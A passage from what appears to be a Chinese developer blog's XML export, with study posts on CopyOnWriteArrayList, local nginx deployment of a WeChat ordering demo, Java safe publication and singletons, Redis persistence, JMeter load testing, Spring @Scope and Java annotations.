semantics // 设置数组 setArray(elements); &#125; // 相等则直接返回旧值即可 return oldValue; &#125; finally &#123; // 释放锁 lock.unlock(); &#125;&#125; 说明：此函数用于用指定的元素替代此列表指定位置上的元素，也是基于数组的复制来实现的。 4.6 移除指定索引的元素1234567891011121314151617181920212223242526272829303132333435public E remove(int index) &#123; // 可重入锁 final ReentrantLock lock = this.lock; // 获取锁 lock.lock(); try &#123; // 获取数组 Object[] elements = getArray(); // 数组长度 int len = elements.length; // 获取旧值 E oldValue = get(elements, index); // 需要移动的元素个数 int numMoved = len - index - 1; if (numMoved == 0) // 移动个数为0，即移除的是数组末尾的元素 // 复制后设置数组 setArray(Arrays.copyOf(elements, len - 1)); else &#123; // 移动个数不为0，移除的是非末尾的元素 // 新生数组 Object[] newElements = new Object[len - 1]; // 复制index索引之前的元素 System.arraycopy(elements, 0, newElements, 0, index); // 复制index索引之后的元素 System.arraycopy(elements, index + 1, newElements, index, numMoved); // 设置索引 setArray(newElements); &#125; // 返回旧值 return oldValue; &#125; finally &#123; // 释放锁 lock.unlock(); &#125;&#125; 12345678说明：此函数用于移除此列表指定位置上的元素。处理流程如下 ① 获取锁，获取数组elements，数组长度为length，获取索引的值elements[index]，计算需要移动的元素个数（length - index - 1）,若个数为0，则表示移除的是数组的最后一个元素，复制elements数组，复制长度为length-1，然后设置数组，进入步骤③；否则，进入步骤② ② 先复制index索引前的元素，再复制index索引后的元素，然后设置数组。 ③ 释放锁，返回旧值。 4.7 获取指定索引的元素1234567public E get(int index) &#123; return get(getArray(), index);&#125;private E get(Object[] a, int index) &#123; return (E) a[index];&#125; 通过写时复制的方式，CopyOnWriteArrayList 的 get 方法不用加锁也可以保证线程安全，所以 CopyOnWriteArrayList 并发读的效率是非常高的，它是直接通过数组下标获取元素的。 三、总结简单而言要记住它的三个特点： 1、CopyOnWriteArrayList 是一个并发的数组容器，它的底层实现是数组。 2、CopyOnWriteArrayList 采用写时复制的方式来保证线程安全。 3、通过写时复制的方式，可以高效的进行并发读，但是对于写操作，每次都要进行加锁以及拷贝副本，效率非常低，所以 CopyOnWriteArrayList 仅适合==读多写少==的场景。 4、Vector虽然是线程安全的，但是只是一种相对的线程安全而不是绝对的线程安全，它只能够保证增、删、改、查的单个操作一定是原子的，不会被打断，但是如果组合起来用，并不能保证线程安全性。 5、CopyOnWriteArrayList在并发下不会产生任何的线程安全问题，也就是==绝对的线程安全== 另外，有两点必须讲一下。我认为CopyOnWriteArrayList这个并发组件，其实反映的是两个十分重要的分布式理念： ==（1）读写分离== 我们读取CopyOnWriteArrayList的时候读取的是CopyOnWriteArrayList中的Object[] array，但是修改的时候，操作的是一个新的Object[] array，读和写操作的不是同一个对象，这就是读写分离。这种技术数据库用的非常多，在高并发下为了缓解数据库的压力，即使做了缓存也要对数据库做读写分离，读的时候使用读库，写的时候使用写库，然后读库、写库之间进行一定的同步，这样就避免同一个库上读、写的IO操作太多 ==（2）最终一致== 对CopyOnWriteArrayList来说，线程1读取集合里面的数据，未必是最新的数据。因为线程2、线程3、线程4四个线程都修改了CopyOnWriteArrayList里面的数据，但是线程1拿到的还是最老的那个Object[] array，新添加进去的数据并没有，所以线程1读取的内容未必准确。不过这些数据虽然对于线程1是不一致的，但是对于之后的线程一定是一致的，它们拿到的Object[] array一定是三个线程都操作完毕之后的Object array[]，这就是最终一致。最终一致对于分布式系统也非常重要，它通过容忍一定时间的数据不一致，提升整个分布式系统的可用性与分区容错性。当然，最终一致并不是任何场景都适用的，像火车站售票这种系统用户对于数据的实时性要求非常非常高，就必须做成强一致性的。 最后总结一点，随着CopyOnWriteArrayList中元素的增加，CopyOnWriteArrayList的修改代价将越来越昂贵，因此，CopyOnWriteArrayList适用于读操作远多于修改操作的并发场景中。 感谢 http://www.cnblogs.com/xrq730/p/5020760.html http://blog.csdn.net/u013124587/article/details/52863533 https://www.cnblogs.com/leesf456/p/5547853.html]]></content>
      <tags>
        <tag>java容器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[4.部署在本机环境]]></title>
    <url>%2F2018%2F07%2F21%2F4.%E9%83%A8%E7%BD%B2%E5%9C%A8%E6%9C%AC%E6%9C%BA%E7%8E%AF%E5%A2%83%2F</url>
    <content type="text"><![CDATA[慕课网微信点餐系统学习 1、针对慕课网上springboot微信点餐系统中虚拟机 由于一直将资源放在别人做好的虚拟机中，我的心里很难受，因为一直感觉不是自己的东西，虽然我自己不会做这个前端（捂脸），但是我可以把它移植到我的本机上啊，懂了这个，我就可以把他部署在自己的linux服务器上了，岂不是美美的？！ 2、作为开发，jdk就没什么好说的了3、安装nginx，这个也不需要配置，装好之后，输入localhost看到欢迎页面即可4、安装Nodejs5、安装什么的，不想赘述。一开始有这些就足够了，后面的再说。6、重头戏：将他提供给我们的虚拟机中的1/opt/data/code 下面的所有东西先拷贝到本机上吧。这个就是前端所有的文件，==当然用的并不是他==。 7、在他的 sell_fe_buyer 目录下面，打开黑窗口，输入1npm run build 命令，如果没什么问题，就会产生一些js文件，然后等待执行完毕，将dist目录下的所有文件拷贝到比如我的：1E:\code\wwwroot\sell 下面。 8、修改Nginx的配置文件nginx.conf:1234567location / &#123; root E:\code\wwwroot\sell;//静态资源存放的位置，就是上面dist下面文件存放的目录 index index.html index.htm;&#125;location /sell/ &#123; proxy_pass http://127.0.0.1:8080/sell/;//因为项目的一级目录是sell，所以这边加一下&#125; 执行1nginx -s reload 重新加载一下。 9、在工程文件下的1resources/static 下新建文件夹api。将1ratings.json和seller.json 两个文件拷贝进去。启动项目。 10、输入localhost访问1http://localhost 试试吧。 12.10号更新 11、域名访问用Localhost访问实在太low，决定跟视频中一样用sell.com进行访问。 首先是在电脑中配置hosts文件： 1192.168.1.107 sell.com 该文件的位置是：C:\Windows\System32\drivers\etc 然后配置nginx： server_name和proxy_pass这两个。12345678910111213141516server &#123; listen 80; server_name sell.com; #charset koi8-r; #access_log logs/host.access.log main; location / &#123; root E:\code\wwwroot\sell; index index.html index.htm; &#125; location /sell/ &#123; proxy_pass http://192.168.1.107:8080/sell/; &#125; 然后呢，购买一个花生壳软件，你的微信开发要用域名。我这里的域名是1dm8911156.imwork.net，映射我的内网的80端口，将我本机的ipv4地址写进去。这样，内网就映射到域名上了。 不要忘记，在它的前端代码中 E:\code\sell_fe_buyer\config 下的 index.js中，需要配置： 123sellUrl: &apos;http://sell.com&apos;, //域名openidUrl: &apos;http://1dm8911156.imwork.net/sell/wechat/authorize&apos;, //微信的获取openid的路径wechatPayUrl: &apos;http://127.0.0.1&apos; //支付路径，暂时不变 这样，重启一下，在PC端的微信调试工具中输入sell.com，应该就可以正常访问了。 12、手机上访问首先是保证手机和电脑在同一个网段。 视频中演示了mac用户的操作步骤，我是win10系统，所以说一下fiddler是如何操作的吧！ 首先是下载个软件。。 安装。。。 打开。。。 点击上面的Tools—-Options—Connections 将坐下一列中的Allow remote computers to connect,点击ok，重启一下。 手机上打开设置中的WALN，找到你连接的无线网，找到代理，选择手动方式，然后输入你的主机ipv4的地址和默认的端口8888,手机上可以随便访问一个网页，看fiddler是不是能捕获到。如果可以，在微信中输入sell.com即可。 13、支付没法做啊。。。账号还要付钱才能试用一个月。算了，以后遇到再说吧。 这里我将其支付页面，直接跳转到订单详情页面： create.ftl:1234567&lt;script&gt; function myfun() &#123; alert("$&#123;status&#125;"); location.href = "$&#123;returnUrl&#125;"; &#125; window.onload=myfun;//不要括号&lt;/script&gt; 14、因为前端的代码不会改所以有一些操作我只能依靠postman完成了。 支付： http://sell.com/sell/buyer/order/paid?orderId=ORDERID&amp;openid=OPENID 个人订单列表(分页)： http://sell.com/sell/buyer/order/list?openid=OPENID 某个人的某个订单详情： http://sell.com/sell/buyer/order/detail?orderId=ORDERID&amp;openid=OPENID 不过，倒是可以在页面上实现订单的取消。还不错。 至此，买家端除了支付没有实现，其他都实现了。]]></content>
      <tags>
        <tag>微信点餐系统</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[4.安全发布对象]]></title>
    <url>%2F2018%2F07%2F21%2F4.%E5%AE%89%E5%85%A8%E5%8F%91%E5%B8%83%E5%AF%B9%E8%B1%A1%2F</url>
    <content type="text"><![CDATA[学习如何安全发布一个对象。 1. 不安全的行为 发布对象：使一个对象能够被当前范围之外的代码所使用 123456789101112131415161718192021@Slf4j@NotThreadSafepublic class UnSafePublish &#123; private String[] states = &#123;"a","b","c"&#125;; //发布类的域states //在类的外面线程都可以访问到这个域并且进行修改，所以这是不安全的发布方式 public String[] getStates()&#123; return states; &#125; public static void main(String[] args) &#123; UnSafePublish unSafePublish = new UnSafePublish(); log.info("1.--&#123;&#125;", Arrays.toString(unSafePublish.getStates()));//1.--[a, b, c] //拿到引用之後就可以直接修改，其他线程也可以拿到这个引用进行修改 unSafePublish.getStates()[0] = "d"; log.info("2.--&#123;&#125;",Arrays.toString(unSafePublish.getStates()));//2.--[d, b, c] &#125;&#125; 对象逸出：一种错误的发布，当一个对象还没有构造完成时，就使它被其他线程所见。 12345678910111213141516171819202122@Slf4j@NotThreadSafe@NotRecommendpublic class Escape &#123; private int thisCanBeEscape = 1; public Escape()&#123; new InnerClass(); &#125; //new Escape();还没构造完成，其他线程已经看到这个对象，不安全 private class InnerClass&#123; public InnerClass()&#123; //this引用逸出 log.info("&#123;&#125;",Escape.this.thisCanBeEscape);//1 &#125; &#125; public static void main(String[] args) &#123; new Escape(); &#125;&#125; 那么如何正确创建对象呢？ 将类声明为final，这样就不能被继承了 将所有成员声明为private，这样就不能直接访问成员 对变量不提供set方法，所有可变成员变量声明为final，只有只能赋值一次 通过构造器初始化所有成员，进行深度拷贝，在get方法中不直接返回对象本身，而是克隆对象，返回对象的拷贝。 2. 安全发布对象2.1 在静态初始化函数中初始化一个对象引用2.2 将对象的引用保存到volatile类型域或者AtomicReference对象中2.3 将对象的引用保存到某个正确构造函数对象的final类型域中2.4 将对象的引用保存到一个由锁保护的域中就以单例模式为例，是在静态域中初始化一个对象引用的，但是线程不安全。 1234567891011121314151617/** * 懒汉模式，线程不安全 */@NotThreadSafepublic class SingletonExample1 &#123; private SingletonExample1()&#123;&#125; private static SingletonExample1 instance = null; //静态工厂方法 public static SingletonExample1 getInstance()&#123; if(instance == null)&#123; instance = new SingletonExample1(); &#125; return instance; &#125;&#125; 懒汉模式，在static直接赋值，static只执行一次，所以不会重复创建。12345678910111213/** * 饿汉模式，线程安全 */@ThreadSafepublic class SingletonExample2 &#123; private SingletonExample2()&#123;&#125; private static SingletonExample2 instance = new SingletonExample2(); public static SingletonExample2 getInstance()&#123; return instance; &#125;&#125; 对于懒汉模式，如何使其变成线程安全的呢？用加锁和volatile类型域来保证。 1234567891011121314151617181920212223242526272829/** * 懒汉模式，线程安全 */@ThreadSafepublic class SingletonExample3 &#123; private SingletonExample3()&#123;&#125; private static volatile SingletonExample3 instance = null; public static SingletonExample3 getInstance()&#123; if(instance == null)&#123; synchronized (SingletonExample2.class)&#123; if(instance == null)&#123; instance = new SingletonExample3(); //1. memory = allocate() 分配对象的内存空间 //2. initMemory() 初始化对象 //3. instance = memory 设置instance指向刚分配的内存 //不加volatile，为什么线程不安全呢？ //JVM和cpu优化，会发生指令重排，上述的123可能会变成132 //假设有两个线程A，B进来，线程A执行到第一个if(instance == null)判断之前 //而线程B进入synchronized，执行了13，此时，instance=memory执行完有值了 //那么此时执行A，判断到instance不为null，那么直接返回instance了，但是还没有进行初始化 &#125; &#125; &#125; return instance; &#125;&#125; 当然了，饿汉模式也可以用static静态块来初始化： 12345678910111213141516171819202122/** * 饿汉模式-staic块实现 */@ThreadSafepublic class SingletonExample4 &#123; private SingletonExample4()&#123;&#125; private static SingletonExample4 instance = null; static &#123; instance = new SingletonExample4(); &#125; public static SingletonExample4 getInstance()&#123; return instance; &#125; public static void main(String[] args) &#123; System.out.println(getInstance()); System.out.println(getInstance()); &#125;&#125; 注意，如果写成这样呢？ 12345678910111213141516171819202122/** * 饿汉模式-staic块实现 */@ThreadSafepublic class SingletonExample4 &#123; private SingletonExample4()&#123;&#125; static &#123; instance = new SingletonExample4(); &#125; private static SingletonExample4 instance = null; public static SingletonExample4 getInstance()&#123; return instance; &#125; public static void main(String[] args) &#123; System.out.println(getInstance());//null System.out.println(getInstance());//null &#125;&#125; 按照顺序执行，对于instance，后面可以赋值，但是不能访问，所以为null. 有一种方式是绝对线程安全的，并且不需要加锁或者volatile，是JVM保证的只加载一次—-enum 123456789101112131415161718192021222324@ThreadSafe@Recommendpublic class SingletonExample5 &#123; private SingletonExample5()&#123;&#125; public static SingletonExample5 getInstance()&#123; return Singleton.INSTANCE.getInstance(); &#125; private enum Singleton&#123; INSTANCE; private SingletonExample5 singleton; //JVM保证这个方法绝对只调用一次 Singleton()&#123; singleton = new SingletonExample5(); &#125; public SingletonExample5 getInstance()&#123; return singleton; &#125; &#125;&#125;]]></content>
      <tags>
        <tag>java并发进阶</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[4.redis持久化]]></title>
    <url>%2F2018%2F07%2F21%2F4.redis%E6%8C%81%E4%B9%85%E5%8C%96%2F</url>
    <content type="text"><![CDATA[介绍redis持久化。 1. 什么是持久化redis所有数据保持在内存中，对数据的更新将异步地保存到磁盘中。 2. 持久化的方式快照—mysql dump或者redis rdb 写日志—mysql binlog或者hbase glog或者redis aof 3. RDB什么是RDB 触发机制三种主要方式 save(同步) save是同步的，当保存的数据量很大时，可能造成redis的阻塞，即客户端访问redis被阻塞。 他的文件策略是：如果存在老的RDB文件，则新的替换老的。复杂度为O(n)。 bgsave(异步) 一般情况下，fork是比较快的，但是也可以会慢，这时会阻塞redis。只要fork不慢，客户端不会被阻塞。 他的文件策略和复杂度与save是一样的。 save和bgsave两者对比： 自动 redis的自动保存的默认配置是： 配置 seconds changes save 900 1 save 300 10 save 60 10000 就是说，在60秒内改变了10000条数据，就自动保存；在300秒内有10条改变才自动保存；900秒内有1一条改变就保存。 RDB总结 RDB是Redis内存到硬盘的快照，用于持久化。 save通常会阻塞redis。 bgsave不会阻塞redis，但是会fork新进程。 save自动配置满足任一就会被执行。 有些触发机制不容忽视。 4. AOFRDB问题O(n)数据的备份，很耗时间；对于bgsave来说，fork()是一个很消耗内存的操作；将数据全写到硬盘，必然对硬盘IO占用很大。 还有一点是：某个时间点宕机，那么在某个时间段的数据就丢失了。 AOF原理将对redis的操作追加到aof文件中。当redis宕机之后，使用aof恢复所有的操作继而实现数据的恢复。 AOF三种策略 always everysec redis出现故障，有可能丢失一秒的数据。redis默认方式。 no 三种策略的比较 AOF重写 好处是：减少硬盘占用量、加速恢复速度 实现的两种方式：bgrewriteaof和aof重写配置 bgrewriteaof 注意：这里的重写并不是上面演示的，将原来的aof文件进行重写，而是对redis的内存数据进行一次回溯。 aof重写流程 也就是说，子进程在执行 AOF 重写时，主进程需要执行以下三个工作： 1.处理命令请求； 2.将写命令追加到现有的 AOF 文件中； 3.将写命令追加到 AOF 重写缓存中。 如此可以保证： 现有的AOF功能继续执行，即使 AOF 重写期间发生停机，也不会有任何数据丢失； 所有对数据库进行修改的命令都会被记录到 AOF 重写缓存中。 当子进程完成对 AOF 文件重写之后，它会向父进程发送一个完成信号，父进程接到该完成信号之后，会调用一个信号处理函数，该函数完成以下工作：(阻塞) 将 AOF 重写缓存中的内容全部写入到新的 AOF 文件中；(现有 AOF 文件、新的 AOF 文件和数据库三者的状态就完全一致了) 对新的 AOF 文件进行改名，覆盖原有的 AOF 文件。(执行完毕后，程序就完成了新旧两个 AOF 文件的替换) 当这个信号处理函数执行完毕之后，主进程就可以继续像往常一样接收命令请求了。在整个 AOF 后台重写过程中，只有最后的“主进程写入命令到AOF缓存”和“对新的 AOF 文件进行改名，覆盖原有的 AOF 文件。”这两个步骤会造成主进程阻塞，在其他时候， AOF 后台重写都不会对主进程造成阻塞，这将 AOF 重写对性能造成的影响降到最低。 小结： AOF 重写的目的是用更小的体积来保存数据库状态，整个重写过程基本上不影响 Redis 主进程处理命令请求； AOF 重写其实是一个有歧义的名字，实际上重写工作是针对数据库的当前值来进行的，重写过程中不会读写、也不适用原来的 AOF 文件； AOF 可以由用户手动触发，也可以由服务器自动触发。 5. 持久化的取舍和选择RDB和AOF对比 RDB最佳策略“关”：建议关闭，但是后面主从复制功能是需要他的，因为需要主节点执行dbsave，然后将rdb文件传给从节点。所以说，关不是永久关。 “集中管理”：虽然RDB很重，但是对于数据备份是很重要的，按照小时或者天集中地进行备份比较好，因为他的文件很小，利于传输。 “主从，从开”：有时候从节点打开这个功能是比较好的，但是备份太频繁，取决于实际的场景。 AOF最佳策略“开”：建议打开，如果仅仅是作为一个普通缓存，对于数据要求不是很高，这次数据丢了，下次可以从数据库取(数据库压力不是很大)，这种情况就建议关闭，因为AOF还是有性能开销的。 “AOF重写集中管理” “everysec” 最佳策略“小分片” “缓存或者存储” “监控(硬盘、内存、负载、网络)” “足够的内存” 6. 总结 http://www.ywnds.com/?p=4876]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>redis学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[4.JMeter压测]]></title>
    <url>%2F2018%2F07%2F21%2F4.JMeter%E5%8E%8B%E6%B5%8B%2F</url>
    <content type="text"><![CDATA[压力测试，模拟高并发场景。 1. JMeter入门 官网：https://jmeter.apache.org/ 使用：点击bat文件即可用运行 步骤：添加线程组、添加监听器(聚合报告)、线程组右键-&gt;添加sampler-》http请求 在本地对/goods/to_list这个简单的压力测试，其实这个接口里面就一个任务： 1List&lt;GoodsVo&gt; goodsVoList = goodsService.getGoodsVoList(); 那么，我以1000的并发，循环10次，尽快执行完。测试结果发现吞吐量最高大约是350。这个并发量比较小。 2. 自定义变量模拟多用户模拟多个不同用户同时操作。其实就是建立一个文件，然后引用配置文件中变量即可。下面有示例。 测试计划-&gt;添加配置元件-&gt;CSV Data Set Config 引用变量${} 3. JMeter命令行使用先在本地用软件生成一个jmx文件，将其上传到Liunx服务器上，这个服务器上现在跑当前程序的war包，如何生成这个war见下面介绍。 在linux上安装好jmeter执行： jmeter.sh -n -t xxx.jmx -l result.jtl 生成结果保存到result.jtl文件中。可以在图形化界面软件中打开这个结果进行查看。 在一台linux上进行测试，接口就上面提到的to_list。5000并发量，循环10次，在上面的测试结果大概是1267的QPS。记录此值，下面进行优化。 3.1 秒杀接口测试我们的重点是对do_miaosha这个接口进行测试。但是呢，我们不能用一个user来测试，所以在压测之前，我们需要准备好数据： 整体思路是：先往数据库插入5000条数据，然后生成5000个token到一个txt文件中。 3.2 连接数据库的工具类:DBUtil123456789101112131415161718192021222324public class DBUtil &#123; private static Properties props; static &#123; try &#123; InputStream in = DBUtil.class.getClassLoader().getResourceAsStream("db.properties"); props = new Properties(); props.load(in); in.close(); &#125;catch(Exception e) &#123; e.printStackTrace(); &#125; &#125; public static Connection getConn() throws Exception&#123; String url = props.getProperty("spring.datasource.url"); String username = props.getProperty("spring.datasource.username"); String password = props.getProperty("spring.datasource.password"); String driver = props.getProperty("spring.datasource.driver-class-name"); Class.forName(driver); return DriverManager.getConnection(url,username, password); &#125;&#125; 3.3 db.properties文件123456spring.datasource.url=jdbc:mysql://127.0.0.1:3306/miaosha?useUnicode=true&amp;characterEncoding=utf-8&amp;allowMultiQueries=true&amp;useSSL=falsespring.datasource.username=rootspring.datasource.password=123456spring.datasource.driver-class-name=com.mysql.jdbc.Driverspring.datasource.type=com.alibaba.druid.pool.DruidDataSourcespring.datasource.filters=stat 3.4 执行程序，要先启动web程序12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182public class UserUtil &#123; private static void createUser(int count) throws Exception&#123; List&lt;MiaoshaUser&gt; users = new ArrayList&lt;MiaoshaUser&gt;(count); //生成用户 for(int i=0;i&lt;count;i++) &#123; MiaoshaUser user = new MiaoshaUser(); user.setId(13000000000L+i); user.setLoginCount(1); user.setNickname("user"+i); user.setRegisterDate(new Date()); user.setSalt("1a2b3c"); user.setPassword(MD5Util.inputPassToDbPass("123456", user.getSalt())); users.add(user); &#125; System.out.println("create user");// //插入数据库 Connection conn = DBUtil.getConn(); String sql = "insert into miaosha_user(login_count, nickname, register_date, salt, password, id)values(?,?,?,?,?,?)"; PreparedStatement pstmt = conn.prepareStatement(sql); for(int i=0;i&lt;users.size();i++) &#123; MiaoshaUser user = users.get(i); pstmt.setInt(1, user.getLoginCount()); pstmt.setString(2, user.getNickname()); pstmt.setTimestamp(3, new Timestamp(user.getRegisterDate().getTime())); pstmt.setString(4, user.getSalt()); pstmt.setString(5, user.getPassword()); pstmt.setLong(6, user.getId()); pstmt.addBatch(); &#125; pstmt.executeBatch(); pstmt.close(); conn.close(); System.out.println("insert to db"); //登录，生成token String urlString = "http://localhost:8080/login/do_login"; File file = new File("D:/tokens.txt"); if(file.exists()) &#123; file.delete(); &#125; RandomAccessFile raf = new RandomAccessFile(file, "rw"); file.createNewFile(); raf.seek(0); for(int i=0;i&lt;users.size();i++) &#123; MiaoshaUser user = users.get(i); URL url = new URL(urlString); HttpURLConnection co = (HttpURLConnection)url.openConnection(); co.setRequestMethod("POST"); co.setDoOutput(true); OutputStream out = co.getOutputStream(); String params = "mobile="+user.getId()+"&amp;password="+MD5Util.inputPassToFormPass("123456"); out.write(params.getBytes()); out.flush(); InputStream inputStream = co.getInputStream(); ByteArrayOutputStream bout = new ByteArrayOutputStream(); byte buff[] = new byte[1024]; int len = 0; while((len = inputStream.read(buff)) &gt;= 0) &#123; bout.write(buff, 0 ,len); &#125; inputStream.close(); bout.close(); String response = new String(bout.toByteArray()); JSONObject jo = JSON.parseObject(response); String token = jo.getString("data"); System.out.println("create token : " + user.getId()); String row = user.getId()+","+token; raf.seek(raf.length()); raf.write(row.getBytes()); raf.write("\r\n".getBytes()); System.out.println("write to file : " + user.getId()); &#125; raf.close(); System.out.println("over"); &#125; public static void main(String[] args)throws Exception &#123; createUser(5000); &#125;&#125; 最后查看数据库是否生成了5000条用户信息，以及是否在D盘下生成了相应的token文件。 我们的目标是生成userId和token的文件，所以我们需要对doLogin这个方法进行修改，原来是返回Result&lt;Boolean&gt;，现在返回Result&lt;String&gt;,这个String就是生成的token。 如果顺利的话，生成的文件是这样的： 123413000000000,3e9e716b555047f2af8ccdb3224da4f213000000001,53f55f4b1b3247669c5c2588548d8ee813000000002,87a313072df74b2d944c3227b14c2d4a13000000003,77c7e4a834fd4986952a78c18c27d22c 下面，打开JMeter软件，首先是按照上面的步骤CSV Data Set Config，引入tokens.txt这个文件。在Variable Names这一项写上userId,token，这样，就可以获取到这两个参数。 然后配置好http请求： 用Aggregate Report来查看结果。这里用5000的并发来发请求。 我在数据库准备5个秒杀商品。 在测试中，发现数据库的秒杀商品数量竟然变成了负数。。这个时候出现了线程安全，我们的超卖现象。 有的时候也能根据预期执行完，我们会发现5000个用户只有5个人抢到了。数据库里只有五条记录。秒杀的压力测试效果我们已经达到了，下面就是线程安全和提高并发量的工作了。 4. redis压测工具redis-benchmark redis-benchmark -h 127.0.0.1 p 6379 -c 100 -n 100000 100个并发连接，100000个请求。 redis-benchmark -h 127.0.0.1 p 6379 -q -d 100 存取大小为100字节的数据包 5. spring Boot打war包 添加spring-boot-starter-tomcat的provided依赖 12345&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt; &lt;scope&gt;provided&lt;/scope&gt;&lt;/dependency&gt; 添加maven-war-plugin插件 12345678910111213141516&lt;build&gt; &lt;finalName&gt;$&#123;project.artifactId&#125;&lt;/finalName&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-war-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;failOnMissingWebXml&gt;false&lt;/failOnMissingWebXml&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; 不要忘记上面的： 1&lt;packaging&gt;jar&lt;/packaging&gt; 改为： 1&lt;packaging&gt;war&lt;/packaging&gt; 最后，修改启动函数： 12345678910111213@EnableTransactionManagement@SpringBootApplicationpublic class MiaoshaApplication extends SpringBootServletInitializer&#123; public static void main(String[] args) &#123; SpringApplication.run(MiaoshaApplication.class, args); &#125; @Override protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) &#123; return builder.sources(MiaoshaApplication.class); &#125;&#125; 执行mvn clean package命令，执行成功，就可以看到war包了。]]></content>
      <tags>
        <tag>秒杀系统实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[4.@Scope-设置组件作用域]]></title>
    <url>%2F2018%2F07%2F21%2F4.%40Scope-%E8%AE%BE%E7%BD%AE%E7%BB%84%E4%BB%B6%E4%BD%9C%E7%94%A8%E5%9F%9F%2F</url>
    <content type="text"><![CDATA[学习spring注解版来实现组件的注册。 spring的bean默认是单实例，下面佐证一下： 123456789101112@Testpublic void test02()&#123; ApplicationContext applicationContext = new AnnotationConfigApplicationContext(MainConfig2.class); String[] names = applicationContext.getBeanDefinitionNames(); for(String name:names)&#123; System.out.println(name); &#125; Object bean = applicationContext.getBean("person"); Object bean1 = applicationContext.getBean("person"); System.out.println(bean == bean1);//true&#125; 那么我们可以配置bean为多例吗？显然是可以的： 12345@Bean@Scope(&quot;prototype&quot;)public Person person()&#123; return new Person(&quot;李四&quot;,20);&#125; @Scope注解中有四个选项： prototype:多例 singleton:单例，默认 request:同一次请求创建一个实例 session:同一个session创建一个实例 着重看一下singleton和prototype，他们的加载时机？ singleton：IOC容器启动时调用方法创建对象放到IOC容器中，以后每次获取都直接从容器中拿，类似于map.get(); prototype:IOC容器启动时不会创建对象，而是在每次获取时才会调用方法创建对象；并且是新new出来的对象，都是不一样的。]]></content>
      <tags>
        <tag>spring学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[4.java注解]]></title>
    <url>%2F2018%2F07%2F21%2F4.java%E6%B3%A8%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[注解是一系列元数据，它提供数据用来解释程序代码，但是注解并非是所解释的代码本身的一部分。注解对于代码的运行效果没有直接影响。–官方定义 注解语法因为平常开发少见，相信有不少的人员会认为注解的地位不高。其实同 classs 和 interface 一样，注解也属于一种类型。它是在 Java SE 5.0 版本中开始引入的概念。 注解的定义注解通过 @interface 关键字进行定义。 1public @interface TestAnnotation &#123;&#125; 你可以简单理解为创建了一张名字为 TestAnnotation 的标签。 注解的使用上面创建了一个注解，那么注解的的使用方法是什么呢。 12@TestAnnotationpublic class Test &#123;&#125; 不过，要想注解能够正常工作，还需要介绍一下一个新的概念那就是元注解。 上面是元注解元注解是可以注解到注解上的注解，或者说元注解是一种基本注解，但是它能够应用到其它的注解上面。 元标签有 @Retention、@Documented、@Target、@Inherited、@Repeatable 5 种。 @Retention Retention 的英文意为保留期的意思。当 @Retention 应用到一个注解上的时候，它解释说明了这个注解的的存活时间。 RetentionPolicy.SOURCE 注解只在源码阶段保留，在编译器进行编译时它将被丢弃忽视。 RetentionPolicy.CLASS 注解只被保留到编译进行的时候，它并不会被加载到 JVM 中。 RetentionPolicy.RUNTIME 注解可以保留到程序运行的时候，它会被加载进入到 JVM 中，所以在程序运行时可以获取到它们。 12@Retention(RetentionPolicy.RUNTIME)public @interface TestAnnotation &#123;&#125; @Documented 顾名思义，这个元注解肯定是和文档有关。它的作用是能够将注解中的元素包含到 Javadoc 中去。 @Target Target 是目标的意思，@Target 指定了注解运用的地方。 ElementType.ANNOTATION_TYPE 可以给一个注解进行注解 ElementType.CONSTRUCTOR 可以给构造方法进行注解 ElementType.FIELD 可以给属性进行注解 ElementType.LOCAL_VARIABLE 可以给局部变量进行注解 ElementType.METHOD 可以给方法进行注解 ElementType.PACKAGE 可以给一个包进行注解 ElementType.PARAMETER 可以给一个方法内的参数进行注解 ElementType.TYPE 可以给一个类型进行注解，比如类、接口、枚举 @Inherited Inherited 是继承的意思，但是它并不是说注解本身可以继承，而是说如果一个超类被 @Inherited 注解过的注解进行注解的话，那么如果它的子类没有被任何注解应用的话，那么这个子类就继承了超类的注解。 1234567891011//定义一个被@Inherited注解的注解@Test@Inherited@Retention(RetentionPolicy.RUNTIME)@interface Test &#123;&#125;//父类被@Test注解，即上面说的被@Inherited 注解过的注解进行注解@Testpublic class A &#123;&#125;//那么class B也拥有@Test注解public class B extends A &#123;&#125; @Repeatable Repeatable 自然是可重复的意思。@Repeatable 是 Java 1.8 才加进来的，所以算是一个新的特性。 什么样的注解会多次应用呢？通常是注解的值可以同时取多个。 举个例子，一个人他既是程序员又是产品经理,同时他还是个画家。 12345678910111213141516171819202122232425262728//按照规定，它里面必须要有一个 value 的属性//属性类型是一个被 @Repeatable 注解过的注解数组，注意它是数组。@interface Persons &#123; Person[] value();&#125;//@Repeatable 后面括号中的类相当于一个容器注解//什么是容器注解呢？就是用来存放其它注解的地方。它本身也是一个注解。@Repeatable(Persons.class)@interface Person&#123; String role() default "";&#125;//有了上面两个注解，Persons相当于一个总标签//他里面可以放任意多个子标签，这些子标签类型是Person//并且是存放于这个总标签的Person类型的数组中。//那么既然有了总标签和放子标签的数组，那么，下面就可以定义子标签//子标签的类型自然就是Person，里面这里假设定义role属性//就是说这些子标签表示人的角色。//自然也就支持多种角色，那么定义多次即可。如下@Person(role="artist")@Person(role="coder")@Person(role="PM")public class SuperMan&#123;&#125; 注解的属性123456789@Target(ElementType.TYPE)@Retention(RetentionPolicy.RUNTIME)public @interface TestAnnotation &#123; public int id() default -1; public String msg() default "Hi";&#125; 